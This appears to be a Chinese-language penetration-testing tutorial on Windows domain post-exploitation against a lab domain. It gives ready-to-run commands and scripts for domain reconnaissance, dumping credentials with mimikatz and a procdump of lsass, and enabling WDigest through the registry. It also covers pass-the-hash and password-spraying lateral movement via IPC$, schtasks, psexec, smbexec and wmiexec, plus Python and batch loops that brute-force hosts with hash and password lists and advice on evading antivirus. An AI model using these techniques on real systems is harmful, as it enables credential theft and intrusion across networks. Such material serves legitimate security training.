## 查看域内后那些主机 Domain Controllers: ## 查看域控主机有哪些 Domain Guest： ## 域访客，权限低 Domain Users: ## 普通域用户 Enterprise Admins: ## 企业系统管理员用户，默认对域控制器有完全控制权 ## 用户信息收集 whoami all ：## 用户权限 net config workstation : ## 登录信息 net user : ## 本地用户 net localgroup : ## 本地用户组 net user domain : ## 获取域用户信息 net group domain :## 获取域用户组信息 wmic useraccount get all : ## 涉及域用户详细信息 net group “Domain Admins” domain : ## 查询域管理员账户 net group “Enterprise Admins” domain : ## 查询域管理员用户组 net group “Domain Controllers” domain : ## 查询域控制器 1-4 凭据信息明文、hash、各种口令等，非常重要的一环 ## 凭据信息收集操作演示，主要是为了收集各种密文、明文、口令等，为后续横向渗透做好准备 ## 计算机用户HASH密码、明文密码等获取 – mimikatz(win)，mimipenguin(linux)不太好用，再找找其他工具 ## 计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)，再找找其他工具 Netsh WLAN show profiles Netsh WLAN show profiles name”无线名称” keyclear 1. 站点源码备份文件、数据库备份文件等 2. 各类数据库Web管理入口，如PhpMyAdmin 3. 浏览器保存密码、浏览器Cookie 4. 其他用户会话、3389和ipc$ 连接记录、回收站内容 5.Windows保存的WIFI密码 6. 网络内部的各种账号和密码，如：Email、VPN、FTP、OA等 1-5 mimikatzhttps://blog.csdn.net/weixin_40412037articledetails113348310 下载的时候，注意，系统如果开启了杀毒软件，会被杀掉的，所以可以先将下载目录设置为免杀的。 mimikatz需要管理员权限才能运行，所以想办法先提权。 privilege::debug 比如，先登录本地管理员，来执行 执行如下指令 1-6 mimipenguinwindows上用mimikatz，linux下可以用下面这个 但是这个没有mimikatz那么强大，下面是这个工具支持的系统版本。 看样子主要是支持ubuntu的。 1-7 各种协议获取口令1-7-1 LaZagne可以通过下面两个工具来获取 这个工具说自己能够获取各类密码，但实际上比较菜，并不能获取所有种类的密码，但是开源免费，支持各类系统。 1-7-2 XenArmor 密码都获取到了，拿到了这些密码，就可以通过这些密码去尝试登录内网中的其他主机，可能就能直接登录上，然后再重复执行这样的动作。 1-8 后续探针(信息收集)存活主机、域控制器、网络架构、服务端口等 ## 探测主机域控架构服务操作演示 ## 为后续横向渗透的思路做准备，针对应用，协议等各类攻击手法 ## 探针域控制器名和地址信息等 net time domain nslookup ping ## 探针域内存活主机及地址信息 nbtscan 192.168.3.024 第三方工具 for L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL” 自带 ## 内部指令 nmap masscan ## 第三方PowerShell脚本 nishang、empire等 #导入模块 nishang https://xw.qq.com/cmsid/20220420A000FO00 Import-Module . ishang.psm1 #设置执行策略 Set-ExecutionPolicy RemoteSigned #获取模块nishang的命令函数 Get-Command -Module nishang #获取常规计算机信息 Get-Information #端口扫描(查看目录对应文件有演示语法、其他同理) Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort # 其他功能，删除补丁、反弹shell、凭据获取 探针域内主机角色和服务信息 1-8-1 nbtscannbtscan这个工具是个老牌工具，功能也不强，而且也不免杀，所以大家知道一下即可。它基于的是Netbios协议来进行主机发现的。工具需要下载来使用。 1-8-2 系统自带指令探测for L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.241.%I | findstr “TTL” #自带内部指令 1-8-3 nmap和masscannmap和masscan属于第三方工具，如果对方开启了蓝队的一些防护或者监测工具，那么很容易被监控到，Powershell脚本就不会被发现，因为它使用的是windows自带的powershell框架来写的脚本，有别人写好的，我们可以直接拿来用，比如nishang和empire，个人感觉nishang比empire好一些。 1-8-4 nishanghttps://github.com/samratashok/nishang 首先打开powershell，powershell其实就是windows自带的脚本程序开发环境，可以通过powershell语言进行开发，和cmd指令差不多的语言，攻击者可以通过编写powershell脚本来对目标主机进行攻击 将powershell切换到我们的nishang目录下 https://xw.qq.com/cmsid/20220420A000FO00 #设置执行策略，输入命令 Set-ExecutionPolicy RemoteSigned，有选项提示选择Y就行。 RemoteSigned——运行本地的script不需要数字签名，但是运行从网络上下载的script就必须要有数字签名 Set-ExecutionPolicy RemoteSigned set-executionpolicy Bypass #导入模块 nishang Import-Module . ishang.psm1 #获取模块nishang的命令函数 Get-Command -Module nishang #获取常规计算机信息 Get-Information #端口扫描(查看目录对应文件有演示语法、其他同理) Invoke-PortScan -StartAddress 192.168.241.0 -EndAddress 192.168.241.100 - ResolveHost -ScanPort # 其他功能，删除补丁、反弹shell、凭据获取 导入模块，由于我们使用的版本比较高，我们的电脑的依赖环境版本比较低，导致会报错，没关系，忽略报错，或者升级一下依赖，这个在nishang的文档中有写到，或者百度一下。如果报错了，那么再次导入模块。 获取模块nishang的命令函数，也就是提供了哪些功能 获取计算机常规信息 Get-Information 探测存活主机和开放的端口，这期间由于我的虚拟机不太稳定，所以powshell经常停止工作，多试几次就看到效果了。 大公司中，我们需要探测的信息有: 探针域内主机角色及服务信息 利用开放端口服务及计算机名判断 核心业务机器 1. 高级管理人员、系统管理员、财务人事业务人员的个人计算机 2. 产品管理系统服务器 3. 办公系统服务器 4. 财务应用系统服务器 5. 核心产品源码服务器(自建SVN、GIT等) 6. 数据库服务器 7. 文件或者网盘服务器、共享服务器 8. 电子邮件服务器 9. 网络监控系统服务器 10. 其他服务器(内部技术文档服务器、其他监控服务器等) 还可以通过nishang来调用mimikatz，它集成了mimikatz的功能。 1-9 域渗透之传递攻击1-9-1 口令传递# 案例1-横向渗透明文传递adschtasks ## 在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？这里仅介绍atschtasks命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。获取到某与主机权限-mimikatz得到密码(明文、hash) -用到信息收集里面域用户的列表当作用户名字典-用到密码明文当作密码字典- 尝试连接-创建计划任务(at|schtasks) -执行文件可为后门或者 相关命令 利用流程 1. 建立IPC链接到目标主机 2. 拷贝要执行的命令脚本到目标主机 3. 查看目标时间，创建计划任务(at、schtasks)，定时执行拷贝到的脚本 4. 删除IPC链接 net use \\server\\ipc$ “password” user:username #工作组 net use \\server\\ipc$ “password” user:domain\\username #域内 dir \\xx.xx.xx.xx\\c$\\ #查看文件列表 copy \\xx.xx.xx.xx\\c$\\1.bat 1.bat #下载文件 copy 1.bat \\xx.xx.xx.xx\\c$ #复制文件 net use \\xx.xx.xx.xx\\c$\\1.bat del #删除IPC net view xx.xx.xx.xx #查看对方共享 5. 建立IPC常见的错误代码 错误号5： ## 拒绝访问，权限不够； 错误号51： ## 无法找到网络路径（网络有问题）。 错误号53：## 找不到网络路径（ip地址错误；目标主机未开机；目标主机lanmanserver服务未启动；目标主机防火墙设置过滤端口）。 错误号67：## 找不到网络名（本地主机中lanmanworkstation服务未启动或者目标主机删除了ipc$）。 错误号1219： ## 提供的凭据与已存在的凭据集冲突（已经建立了一个ipc$，可以删除再连）。 错误号1326： ## 用户名或密码错误。 错误号1792：## 试图登录，网络登录服务没有启动（目标主机中NetLogon服务未启动）。 错误号2242： ## 该用户的密码已经过期。 6. 建立IPC失败的原因 1. 目标系统不是NT或者以上的操作系统 2. 对方没有打开IPC$共享 3. 对方未开启139、445端口，或者被防火墙屏蔽 4. 输出命令、账号密码有错误 1-1 明文口令传递at和schtasks命令： 注意at主要用于windows server 2012以下版本，schtasks主要是用于大于等于windows server2012版本的环境 at schtasks # at windows2012 net use \\192.168.241.21\\ipc$ “Admin12345” user:god.org\\administrator #建立ipc链接 copy add.bat \\192.168.241.21\\c$ #拷贝执行文件到目标机器 at \\192.168.241.21 15:47 c:\\add.bat #添加计划任务 net use \\192.168.241.159\\ipc$ “123” user:administrator copy add.bat \\192.168.241.159\\c$ # schtasks windows2012 net use \\192.168.241.32\\ipc$ “admin!@#45” user:god.org\\administrator #建立ipc链接 copy add.bat \\192.168.241.32 ru “SYSTEM” tn adduser sc DAILY tr c:\\add.bat F #创建adduser任务对应执行文件 schtasks run s 192.168.241.32 tn adduser i #运行adduser任务 schtasks delete s 192.168.241.21 tn adduser f #删除adduser任务 ## 建立ipc连接(注意：域用户只能和域用户建立ipc连接) net use \\192.168.241.32\\ipc$ “admin!@#45” user:god.org\\administrator ## 复制文件（木马）到其C盘 copy add.bat \\192.168.241.32\\c$ ## 创建adduser任务对应执行文件 schtasks create s 192.168.241.32 ru “SYSTEM” tn adduser sc DAILY tr c:\\add.bat F ## 运行adduser任务 schtasks run s 192.168.241.32 tn adduser i ## 删除adduser任务 schtasks delete s 192.168.241.21 tn adduser f 1-1 at计划任务我们通过mary-pc来测试一下： 如果你用的是本地用户登录的，那么net time会报错，不管你是不是管理员，所以必须在域用户下才能用net time 先看一下域控主机的管理员密码，当然了，我们肯定不是轻易的就能获得域控主机的密码的，就是先看一下 通过我们拿下的webserver主机来获得以下域控主机的ip地址 建立ipc连接 比如我们在webserver主机的c盘上面上传了一个add.bat文件，然后将这个add.bat文件通过ipc连接上传到DC主机上。 注意密码的复杂度高一些，不然用户创建不会成功的，并且不成功也不会有任何的提示。 通过ipc连接将它拷贝到DC主机的c盘上 查看一下DC主机，看看是否上传成功了 通过at来创建计划任务 然后查看DC主机上的用户，等一会后，就有了我们的用户 1-2 schtasks计划任务当我们在winserver 2012及以上版本的系统中执行at指令的时候会报错，请使用schtasks，比如我们通过webserver来连接一下这个server2012 Sql Server的主机，通过它的本地用户和密码来连接试试，也可以用域用户连接试试昂 在这个主机上执行at指令就报错 我们通过webserver来连接一下这个server2012的主机，通过它的本地用户和密码来连接试试，也可以用域用户连接试试昂 然后copy我们的add.bat文件到这个主机的c盘上，就会发现报错了 主要原因是我们连接server2012这个主机的时候，用户的是普通域用户，权限不够，所以不能copy文件到c盘。 那么接下来我们通过server2012这个主机的本地管理员建立ipc连接试试看，报错了，因为两个电脑之家的ipc连接只能建立一个，我们需要先删除之前的连接。下面的图中用户写错了，用 user:administraotr 删除之前使用域用户建立的ipc连接： 然后再通过server2012的本地管理员账号连接一下，注意，由于我们是通过server2012 的本地用户去建立ipc连接，那么我们在webserver主机上使用的用户也不能是域用户，必须是本地用户，不然会提示登录失败。 复制add.bat到server2012的c盘里面 看server2012主机 接下来通过schtasks创建计划任务，来执行add.bat 创建的是一个每天执行的任务，我们可以手动触发一下他，让他现在就执行，如下 查看server2012主机上的用户 1-3 Python脚本批量传递(pass)上面我们使用的批量册数语法中，大家可以看到，其实可以设置三个变量，ip、用户名、密码，但是我们写的for循环批量语句，每次只能设置一个变量，如果想多个变量都自动变化的话，也就是多组合检测，这就需要自己写脚本了或者批处理语句。那么可以通过python语言来写，比较简单，而且通过python的第三方库可以对py程序打包成exe程序来执行，并且做免杀也是可以的，有好多python程序的免杀专题 前期除了收集明文密码HASH等，还收集了用户名，用户名配合密码字典能批量传递 net use \\192.168.241.32\\ipc$ admin!@#45 user:god\\dbadmin # pip install pyinstaller #pyinstaller -F jaden.py 生成可执行exe import os,time ips{ ‘192.168.241.21’, ‘192.168.241.25’, ‘192.168.241.29’, ‘192.168.241.30’, ‘192.168.241.31’, ‘192.168.241.33’ } users{ ‘administrator’, ‘boss’, ‘dbadmin’, ‘fileadmin’, ‘mack’, ‘mary’, ‘vpnadm’, ‘webadmin’ } passs{ ‘admin’, ‘admin!@#45’, ‘Admin12345’ } for ip in ips: for user in users: for mima in passs: exec”net use \\“+”\\“+ip+”\\ipc$ “+mima+” user:god\\“+user print(‘’,exec,’’) os.system(exec) time.sleep(1) 上面就是通过变量替换来尝试和各个主机来进行ipc连接，看看哪个能连接成功。 连接建立好了之后，就可以利用之前讲的创建计划任务，执行计划任务的方式来执行系统指令或者创建用户等操作了。 其实用什么开发语言基本都可以写出来，但是要考虑语言的免杀效果、程序体积大小、执行效率等方面进行考虑。写到python文件中 打包成exe，会自动在当前目录中出现一个dist文件夹，里面放着打包好的exe程序 将exe放到webserver上执行一下看效果 执行过程中如果出现如下错误，可能是你的python版本太高，和现在的系统兼容性不好，将python改为python3.7以下的版本 这两个实验已经成功了，但是这两个实验都是通过明文密码传递进行的，但是如果我们获取到的是hash值呢？mimkatz很可能获取不到明文密码，获取到的是hash值，at和schtasks这两个指令是不能使用hash值的。所以我们要考虑通过hash值如何登录，这里我们可以借助一个网络协议工具包impacket 1-4 工具地址## 涉及资源： Hashcat：https://github.com/hashcat/hashcat ## 密码破解全能工具：Hashcat密码破解攻略： https://www.freebuf.com/sectool/164507.html mimikatz：https://github.com/gentilkiwi/mimikatz impacket：https://github.com/SecureAuthCorp/impacket impacket-examples-windows：https://gitee.com/RichChigga/impacket-examples-windows PsTools：https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools ProcDump：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdumpwmiexec.vbs： https://github.com/realdeveloperongithub/K8tools/blob/master/wmiexec.vbs wmiexec.vbs（找了俩）：https://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs 1-2 hash口令传递mpacket网络协议工具包介绍：https://www.freebuf.com/sectool/175208.html 我们可以去网上下载一下这个工具包，有好多是py文件的，我们现在主要使用的exe程序的，因为简单，不需要安装python环境 2-1 atexec-impacket这个工具是基于at改的，既支持明文传递、也支持hash传递 ## 横向渗透明文hash传递atexec-impacket 源码：https://github.com/SecureAuthCorp/impacket 打包的exe程序：https://gitee.com/RichChigga/impacket-examples-windows atexec.exe .administrator:Admin12345@192.168.241.21 “whoami” #基于目标主机的本地用户明文密码来执行指令 atexec.exe godadministrator:Admin12345@192.168.241.21 “whoami” #基于目标主机的域用户明文密码来执行指令 atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 .administrator@192.168.241.21 “whoami” #基于目标主机的本地用户hash密码来执行指令 ## at和schtasks都不支持hash值的密码，要解决需要用impacket工具包 atexec.exe .[用户名]:[密码]@[IP] “[命令]” atexec.exe [域名][用户名]:[密码]@[IP] “[命令]” atexec.exe -hashes [密码的hash值] .[用户名]@[IP] “[命令]” atexec.exe .administrator:Admin12345@192.168.241.21 “whoami” atexec.exe godadministrator:Admin12345@192.168.241.21 “whoami” atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 .administrator@192.168.241.21 “whoami” 明文口令传递示例： ## 我们看到执行没有问题，hash密码的大家也可以去尝试一下，这里我就不演示了，这个工具的优点就是支持明文密码和hash密码传递，缺点就是别人开发好的第三方工具，不像前面的at和schtasks指令，是系统自带的指令，既然是工具就可能会收到杀软、防火墙等的干扰，还需要考虑对工具进行免杀处理。 2-2 传递思路## 其实正常来讲，我们是不知道域控主机的密码的，按照正常的流程来说，我们拿下了某个web主机，通过mimikatz等工具收集到了web主机本机的用户名和密码信息，然后基于这些获得的信息来进行传递。 1. 通过mimikatz收集明文或hash值的密码，“net user domain”收集域内的用户名，“for L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.241.%I | findstr “TTL””探索域内存活地址 2. 批量扫描，用密码撞库 3. 收集更多密码 4. 重复步骤2和步骤3 获取主机口令信息 ## 我们演示一下，先获取到web主机的用户名和密码，获取到之后，可以拿着这些用户名和密码去尝试连接其他的主机，因为很多管理员再进行管理的时候，为了方便工作或者操作不当，会设置相同用户名和密码，那么其他主机也很有可能是同样的用户名和密码。 我们先将这些用户名和密码保存到某个文件中。就放到atexec.exe所在目录吧 检测存活主机(批量ping) 检测存活的主机，我们的手法很多，比如前面信息收集中提到的那几个工具，大家忘记了的话可以回去复习一下。 下面说一个新的手法，通过ping来批量检测 for L %I in (1,1,245) Do @ping -w 1 -n 1 192.168.241.%I | findstr “TTL” 效果：我目前只开了下面四个主机，这里需要注意一点，那就是ping这个请求，对方可能设置了不允许ping访问，那就ping不到的，换其他的手法。 先把这些ip地址保存到某个文件中，如下 发现了很多主机，然后通过我们获取到的web主机上的密码，来作为字典，去批量连接这些ip主机，这就是一个思路，利用的就是大家密码可能是一样的。 如果发现一样的，那么就继续在这个主机上再进行信息收集，也许会收获更多信息，再利用这些信息进行批量连接测试，这就是思路。 2-3 shell脚本程序批量传递## 利用批处理脚本文件批量尝试横向渗透 ## “%%i”是自变量，值来自后面括号中的.txt文件，每行一个值 ## 批量检测IP对应明文连接 FOR F %i in ([每行一个IP.txt]) do net use \\%i\\ipc$”[密码]” user:[用户名] FOR F %i in (ips.txt) do net use \\%i\\ipc$ “admin!@#45” user:administrator ## 批量检测IP对应明文回显版 FOR F %i in ([每行一个IP.txt]) do atexec.exe .[用户名]:[密码]@%i “[命令]” FOR F %i in (ips.txt) do atexec.exe .administrator:admin!@#45@%i whoami ## 批量检测明文对应IP回显版 FOR F %i in ([每行一个密码.txt]) do atexec.exe .[用户名]:%i@[IP] “[命令]” FOR F %i in (pass.txt) do atexec.exe .administrator:%i@192.168.241.21 whoami ## 批量检测HASH对应IP回显版 FOR F %i in ([每行一个密码的hash值.txt]) do atexec.exe -hashes %i .[用户名]@[IP] “[命令]” ## 针对单个IP进行hash密码传递爆破 FOR F %i in (hash.txt) do atexec.exe -hashes %i .administrator@192.168.241.21 whoami 上面的指令中，其中ips.txt就是我们通过ping探针探测到的存活主机的ip地址文件，比如我们将明文检测的那个指令放到一个批处理文件中，如下 执行上面的批处理文件 通过执行指令的返回结果就知道哪个主机的密码也是我们web主机的密码。比如这个192.168.241.32，然后我们去32主机上看一下密码 虽然在提供的文件中看不到administrator的密码，但是administrator的密码肯定和web主机的密码是一样的，并且我们看到执行的whoami是system权限，那么就可以继续对这个主机进行信息收集了，比如mimikatz获取信息等操作。然后将所有收集到的密码，全部添加到我们上面使用的密码字典文件中，然后再探测。反复如此，很有可能拿到域控主机的口令信息。 我们获取域控主机的常规流程其实不会这么快，这里只是给大家演示原理流程，一般都是拿下一台就信息收集，通过收集到的信息来获取另外一台，慢慢的将主机全部拿下。这就是思路。 1-3 smb和wmi协议来进行明文或者hash传递## Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码 ## Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码 ## 个人系统，vista之后主要是win7、win10等 ## 针对以上情况，我们提供了4种方式解决此类问题 1.利用哈希hash传递（pth、ptk等）进行移动 2.利用其它服务协议（SMB、WMI等）进行哈希移动 3.利用注册表操作开启Wdigest Auth值进行获取 4.利用工具或第三方平台（Hachcat）进行破解获取 知识点2： Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。 ## 注册表修改开启Wdigest Auth值 reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest v UseLogonCredential t REG_DWORD d 1 f 3-1 Procdump+Mimikatz配合获取密码由于mimikatz会被杀软杀掉，所以当mimikatz获取失败时配合procdump获取密码 ## 通过procdump获取密码，生成储存着密码hash值的.dmp文件 procdump -accepteula -ma lsass.exe lsass.dmp ## 将dmp文件放到mimikatz上执行 sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full ## 附两款提取密码的软件 Pwdump7 QuarksPwdump Hashcat破解获取Windows NTML Hash hashcat -a 0 -m 1000 hash file –force ## 该工具还支持更多密码破解 通过procdump获取密码： 交给mimikatz来解析 再执行如下指令 sekurlsa::logonPasswords full 密码获取成功，思路：在目标主机上执行procdump，然后将lsass.dmp文件交给我们的攻击机上的mimikatz来打开。以防mimikatz在目标主机上被拦截或者禁用或者被杀掉的情况。 3-2 NTML-Hash密码破解破解前可以使用tspkg，wdigest，kerberos模块提供的密码进行尝试。hash，译作哈希或者散列，是指将任意长度的输入，经过散列算法生成固定长度的密文，也就是散列值。目前来说，hash函数主要有MD5、SHA1、NTLM等算法。 散列过程是不可逆的，并且可能存在多个输入对应着同一个散列值（哈希碰撞）。破解hash算法有字典攻击、查表法、反向查表法、彩虹表等多种方式。在线破解网站推荐使用：cmd5、ophcrack 离线破解工具推荐使用：hashcat、john hashcat的大致指令如下： Hashcat破解获取Windows NTML Hash hashcat -a 0 -m 1000 hash file –force ## 该工具还支持更多密码破解 也就是我们通过procdump拿到的hash密码，可以通过hashcat来爆破，不一定能够爆破出来，但是概率很大。 我这里没有安装这个工具，大家看一看即可https://www.freebuf.com/sectool/164507.html 3-3 smb协议传递## 域横向移动SMB服务利用 psexec、smbexec（官方自带） ## 利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。 ## psexec第一种：先有ipc链接，psexec需要明文或hash传递，注意：本地和域用户写法不同 ## 需要先有ipc链接，-s以System权限运行 net use \\[IP]\\ipc$”[密码]” user:[用户名] net use \\192.168.241.32\\ipc$ “admin!@#45” user:administrator psexec \\[IP] -s cmd psexec \\192.168.241.32 -s cmd ## psexec第二种：不用建立IPC直接提供明文账户密码 psexec \\[IP] -u [用户名] -p [密码] -s cmd psexec \\192.168.241.21 -u administrator -p Admin12345 -s cmd psexec -hashes :[密码的hash值] .[用户名]@[IP] psexec -hashes :$HASH$ .administrator@10.1.2.3 psexec -hashes :[密码的hash值] [域名][用户名]@[IP] psexec -hashes :$HASH$ domainadministrator@10.1.2.3 ## 官方Pstools无法采用hash连接，可以使用impacket工具包，操作简单，但是容易被杀 **3-1 psexec** psexec是windows官方提供的工具，psexec使用的时候有两种方法，推荐第二种，因为第二种不需要建立ipc连接。第一种方法需要建立连接，那么可能会出现无法建立ipc连接的问题。不管是第一种还是第二种，都支持hash值传递。官方的pstools是不能通过hash值来连接的。 官网：https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools**方式1：需要建立ipc连接** 注意，需要管理员权限，也就是说以目标主机的管理员用户来建立ipc连接才可以 先使用普通域用户来建立ipc连接 执行失败 执行psexec这个指令的时候可能会提示如下信息，点击agree即可 在使用本地的管理员用户建立连接，建立成功，拿到了反弹的shell 查看一下目标ip 然后看第二种方法，先看明文的：不需要建立连接 **方式2：不需要建立ipc连接(推荐)** 比如我们直接用获取到的用户名和密码去连接一下域控主机 明文密码传递获取shell hash密码传递获取shell **先导出mimikatz的结果** mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” pssword.txt 找到hash密码 好，对sqlserver主机进行hash传递 psexec -hashes :518b98ad4178a53695dc997aa02d455c .administrator@192.168.241.32 结果如下，报错 因为官方提供的psexec只支持明文密码传递，如果想进行hash传递也是有办法的，我们不需要自己搞了，有一些网上别人对官方psexec进行二次开发的工具，可以支持hash传递，比如第三方工具包impacket，我们在前面信息收集中用到过atexec-impacket，接下来是psexec-impacket 但是运行时可能会报错，编码问题，因为目标主机是gbk编码，现在这个cmd窗口是utf8的 调整cmd编码 CMD 使用命令 chcp 可以查看到当前编码，右键属性也可查看当前cmd使用的编码格式 GBK的代码为936 UTF-8的代码为65001 更改的话 cmd 输入以下命令即可 chcp 936 再次执行，效果如下 成功拿到了shell。 3-2 smbexec 这个工具只有第三方的了，官方没有。 ## smbexec无需先ipc链接明文或hash传递 smbexec [域名][用户名]:[密码]@[IP] smbexec godadministrator:Admin12345@192.168.241.21 smbexec .[用户名]:[密码]@[IP] smbexec .administrator:admin!@#45@192.168.241.32 smbexec -hashes :[密码的hash值] .[用户名]@[IP] smbexec -hashes :$HASH$ .admin@192.168.241.21 # 518b98ad4178a53695dc997aa02d455c 比如： smbexec -hashes :518b98ad4178a53695dc997aa02d455c .admin@192.168.241.21 smbexec -hashes :[密码的hash值] [域名][用户名]@[IP] smbexec -hashes :$HASH$ domainadmin@192.168.241.21 比如： smbexec -hashes :518b98ad4178a53695dc997aa02d455c domainadmin@192.168.241.21 明文传递 用webservser主机的本地管理员用户连接一下域控主机试试，使用域控的域管理员用户连接，连接成功 使用SqlServer主机的本地管理员用户连接一下sqlserver主机 hash传递 先通过mimikatz拿到密文密码，就是那个NTLM，并且下面可以看到明文密码admin!@#45，然后我们看到windows server 2012这个主机的用户名和密码，也是这个密码。然后看一下mary这个个人电脑的密码，明文密码和上面的相同，那么密文密码也就是相同。好，然后我们通过hash值来连接一下sqlserver那个主机： 传递成功 3-4 wmi服务协议传递wmi服务是比smb服务高级一些的，在日志中是找不到痕迹的，但是这个主要是传递的管理员用户凭据。 ## 域横向移动WMI服务利用 cscript、wmiexec、wmic ## WMI(Windows Management Instrumentation)是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。 ## 自带WMIC明文传递，无回显 wmic node:[IP] user:[用户名] password:[密码] process call create “[命令]” wmic node:192.168.241.21 user:administrator password:Admin12345 process call create “cmd.exe c ipconfig C:\\1.txt” ## （运行cmd，执行ipconfig并将结果输出到C盘下的1.txt中），需要导出到某个文件中，然后再读取文件数据自带cscript明文传递，有回显，需要下载wmiexec.vbs配合 cscript nologo wmiexec.vbs shell [IP] [用户名] [密码] cscript nologo wmiexec.vbs shell 192.168.241.21 administrator Admin12345 #会反弹一个shell ## 套件impacket wmiexec明文或hash传递，有回显exe版本，可能被杀 wmiexec .[用户名]:[密码]@[IP] “[命令]” wmiexec .administrator:admin!@#45@192.168.241.32 “whoami” wmiexec [域名][用户名]:[密码]@[IP] “[命令]” wmiexec godadministrator:Admin12345@192.168.241.21 “whoami” wmiexec -hashes :[密码的hash值] .[用户名]:[密码]@[IP] “[命令]” wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .administrator@192.168.241.32 “whoami” wmiexec -hashes :[密码的hash值] [域名][用户名]:[密码]@[IP] “[命令]” wmiexec -hashes :518b98ad4178a53695dc997aa02d455c godadministrator@192.168.241.21 “whoami” 方式1：系统自带的wmic工具 自带的wmic示例，不需要考虑免杀问题。 wmic node:192.168.241.21 user:administrator password:Admin12345 process call create “cmd.exe c ipconfig C:\\1.txt” 目标主机上多了1.txt文件 方式2：系统自带工具cscript cscript，也是系统自带的工具，并且有回显，直接会反弹一个shell回来，但是需要借助到wmiexec.vbs 文件，这个文件在我的百度网盘连接中就有。 cscript nologo wmiexec.vbs shell 192.168.241.21 administrator Admin12345 方式3：第三方工具包 如果有杀软，需要做免杀。支持明文和hash两种方式的wmi传递攻击。 本地用户 wmiexec .administrator:admin!@#45@192.168.241.32 “whoami” wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .administrator@192.168.241.32 “whoami” 域用户 wmiexec godadministrator:Admin12345@192.168.241.21 “whoami” wmiexec -hashes :域控的hash密码 godadministrator@192.168.241.21 “whoami” 明文效果 传递攻击sqlserver和域控主机 hash密码 传递攻击sqlserve主机 总结： 3-5 批量检测横向渗透明文HASH传递批量利用-升级版 利用py脚本制作的exe文件批量尝试横向渗透 将python脚本编译成exe文件 安装pyinstaller pip install pyinstaller 生成可执行EXE Pyinstaller -F [.py文件] 会生成一个同名的exe文件 代码如下： import os,time ips{ ‘192.168.241.21’, ‘192.168.241.25’, ‘192.168.241.29’, ‘192.168.241.30’, ‘192.168.241.31’, ‘192.168.241.33’ } users{ ‘administrator’, ‘boss’, ‘dbadmin’, ‘fileadmin’, ‘mack’, ‘mary’, ‘vpnadm’, ‘webadmin’ } hashs{ ‘518b98ad4178a53695dc997aa02d455c’, ‘hash2’, ‘hash3’ } for ip in ips: for user in users: for mimahash in hashs: exec”wmiexec -hashes :”+mimahash+” god“+user+”@”+ip+” whoami” exec1”wmiexec -hashes :”+mimahash+” .“+user+”@”+ip+” whoami” print(‘’,exec,’’) print(‘’,exec1,’’) os.system(exec) os.system(exec1) time.sleep(0.5) 同样，可以生成exe程序，放到目标主机上运行，这里我就不演示了。 1-9-2 票据传递2-1 概念解析1-1 SAM协议## 服务器消息块（Server Message Block，缩写为SMB），又称网络文件共享系统（Common Internet File System，缩写为CIFS，其实他是升级版的SAM协议），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。它也提供经认证的行程间通信机能。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。SMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API）。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂，SMB协议是基于TCP－NETBIOS下的，一般端口使用为139，445。 ## 安全帐户管理器（Security Accounts Manager），也叫做SAM数据库, SAM 是Windows操作系统管理用户帐户的安全所使用的一种机制。用来存储 Windows 操作系统密码的数据库文件，为了避免明文密码泄漏SAM文件中保存的是明文密码在经过一系列算法处理过的Hash值被保存的Hash分为LMHash、NTLMHash。当用户进行身份认证时会将输入的Hash值与SAM文件中保存的Hash值进行对比。 ## SAM文件保存于 %SystemRoot%\\system32\\config\\sam 中，在注册表中保存在 HKEY_LOCAL_MACHINE\\SAM\\SAM，HKEY_ LOCAL _MACHINE\\SECURITY\\SAM 。在正常情况下SAM文件处于锁定状态不可直接访问、复制、移动，仅有system用户权限才可以读写该文件。 1-2 Samba协议## Samba协议是Unix系统下实现的 Windows文件共享协议-CIFS，由于Windows共享是基于NetBios协议，是基于Ethernet的广播协议，在没有透明网桥的情况下（如VPN）是不能跨网段使用的。它主要用于unix和windows系统进行文件和打印机共享，也可以通过samba套件中的程序挂载到本地使用。Samba服务功能强大，这与其通信基于SMBCIFS协议有关。SMB不仅提供目录和打印机共享，还支持认证、权限设置。在早期，SMB运行于NBT协议（NetBIOS over TCPIP）上，使用UDP协议的137、138及TCP协议的139端口；后期SMB经过开发，可以直接运行于TCPIP协议上，没有额外的NBT层，使用TCP协议的445端口 1-3 NFS协议## NFS是NetworkFileSystem的简写,即网络文件系统。是已故的Sun公司制定的用于分布式访问的文件系统，它的本质是文件系统。主要在Unix系列操作系统上使用，基于TCPIP协议层，可以将远程的计算机磁盘挂载到本地，像本地磁盘一样操作。NFS允许一个系统在网络上与它人共享目录和文件。通过使用NFS，用户和程序可以象访问本地文件一样访问远端系统上的文件。 1-4 FTP协议## FTP（文件传输协议）是一种多通道协议，意为FTP协议有多个端口与外界进行通信，工作模式有“FTP服务器和FTP客户端”。默认使用TCP端口的20和21端口，20端口用于数据传输，21端口用于控制连接。主要作用是为了用户上传和下载文件 上面三者的区别： Samba基于SAM协议 WindowsLinux 文件共享（网上邻居） 